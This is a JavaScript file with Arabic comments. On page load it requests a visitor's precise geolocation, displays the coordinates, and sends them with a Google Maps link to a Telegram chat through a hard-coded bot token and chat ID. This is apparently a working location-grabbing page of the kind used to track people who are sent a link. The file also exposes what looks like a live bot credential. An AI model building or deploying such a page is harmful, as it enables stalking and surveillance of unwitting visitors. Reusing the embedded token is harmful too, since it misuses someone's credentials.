// إعدادات البوت
const BOT_TOKEN = '8448437426:AAGDNRN8rUX2BX8usRnteGq-RmlOxuq7hAE';
const CHAT_ID = '6703506413'; // يجب استبدالها بمعرف الدردشة الخاص بك

// عناصر DOM
const statusElement = document.getElementById('status');
const resultElement = document.getElementById('result');

// دالة رئيسية
async function init() {
    try {
        // 1. طلب إذن الموقع
        statusElement.textContent = 'جاري طلب إذن الموقع...';
        const position = await getLocation();
        
        // 2. عرض النتائج
        const { latitude, longitude } = position.coords;
        statusElement.textContent = 'تم تحديد موقعك بنجاح!';
        resultElement.innerHTML = `
            <p><strong>الإحداثيات:</strong></p>
            <p>خط العرض: ${latitude.toFixed(6)}</p>
            <p>خط الطول: ${longitude.toFixed(6)}</p>
            <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">
                عرض على خرائط جوجل
            </a>
        `;
        
        // 3. إرسال إلى تليجرام
        statusElement.textContent = 'جاري الإرسال إلى تليجرام...';
        await sendToTelegram(latitude, longitude);
        statusElement.textContent = 'تم الإرسال بنجاح!';
        
    } catch (error) {
        handleError(error);
    }
}

// الحصول على الموقع
function getLocation() {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            resolve,
            reject,
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}

// إرسال إلى تليجرام
async function sendToTelegram(lat, lng) {
    if (!CHAT_ID) {
        throw new Error('لم يتم تحديد معرف الدردشة (CHAT_ID)');
    }
    
    const message = `📍 موقع جديد:
- خط العرض: ${lat.toFixed(6)}
- خط الطول: ${lng.toFixed(6)}
- الرابط: https://www.google.com/maps?q=${lat},${lng}`;
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    });
    
    const data = await response.json();
    if (!data.ok) throw new Error(data.description || "خطأ من تليجرام");
}

// معالجة الأخطاء
function handleError(error) {
    console.error('حدث خطأ:', error);
    let message = 'حدث خطأ غير متوقع';
    
    if (error.code === error.PERMISSION_DENIED) {
        message = 'تم رفض إذن الموقع. يرجى منح الصلاحية';
    } else if (error.message.includes('Failed to fetch')) {
        message = 'فشل الاتصال بالخادم. تحقق من اتصال الإنترنت';
    } else if (error.message.includes('chat not found')) {
        message = 'لم يتم العثور على الدردشة. تحقق من معرف الدردشة';
    } else if (error.message.includes('chat_id')) {
        message = 'لم يتم تحديد معرف الدردشة (CHAT_ID)';
    }
    
    statusElement.textContent = message;
    statusElement.style.backgroundColor = '#ffebee';
}

// بدء التشغيل عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', init);
